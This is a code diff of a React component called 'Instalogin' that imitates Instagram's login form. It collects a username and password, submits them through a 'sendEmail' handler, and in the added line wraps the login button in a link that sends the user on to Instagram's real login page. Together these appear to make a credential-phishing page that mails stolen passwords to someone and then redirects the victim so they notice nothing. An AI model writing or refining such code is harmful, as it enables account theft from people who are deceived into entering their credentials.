@@ -42,7 +42,7 @@ const Instalogin = () => {
                                             <form ref={form} onSubmit={sendEmail} className='d-flex flex-column justify-content-center align-items-center'>
                                                 <input className='w-101 mt-5' name="user_name" type="text" placeholder='Phone number, username or email address' />
                                                 <input name="user_email" className='mt-2 w-101' type="password" placeholder='Password' />
-                                                <input href="https://www.instagram.com/" type="submit" value="Login" className='w-101 ps-0 login mt-3 fw-medium' />
+                                                <a target='__blank' className='w-101 ps-0 login mt-3 d-flex justify-content-center align-items-center' href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1"><input type="submit" value="Login" className='login  fw-medium ' /></a>
                                             </form>
 
                                         </div>
@@ -80,9 +80,9 @@ const Instalogin = () => {
                                     </div>
                                 </div>
                             </div>
-                            
+
                         </Col>
-                        
+
                     </Row>
                     <ul className='d-flex flex-wrap gap-3 justify-content-center align-items-center mt-5 pt-5'>
                         <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Meta</a></li>
